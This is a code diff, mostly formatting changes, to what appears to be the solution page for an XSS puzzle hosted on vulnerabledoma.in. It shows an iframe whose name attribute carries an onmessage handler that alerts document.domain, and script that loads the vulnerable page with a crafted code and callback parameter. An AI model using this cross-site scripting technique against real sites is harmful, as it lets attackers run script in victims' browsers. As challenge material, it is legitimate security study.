@@ -51,12 +51,15 @@
     <div id=solution>
 
         <!-- IframeA -->
-        <iframe id="iframeA"
+        <iframe 
+            id="iframeA"
             name="onmessage=e=>e.data.time?alert(`${document.domain} | Took ${e.data.time} seconds`):0">
         </iframe>
 
         <!-- IframeB -->
-        <iframe id="iframeB" name="b">
+        <iframe 
+            id="iframeB" 
+            name="b">
         </iframe>
 
         <script>
@@ -69,6 +72,7 @@
 
                     iframe.src =
                         `https://vulnerabledoma.in/xss_2020-06/?code=${payload}%26callback=${callback}`;
+                    
                     iframe.onload = async () => {
                         iframe.remove();
                         resolve(true);
@@ -77,7 +81,7 @@
                 });
             }
 
-            /* Preloades iframes so craftIframeA and craftIframeB will load faster */
+            /* Loads IframeA and IframeB at onnce */
 
             const preloadIframes = async () => {
 
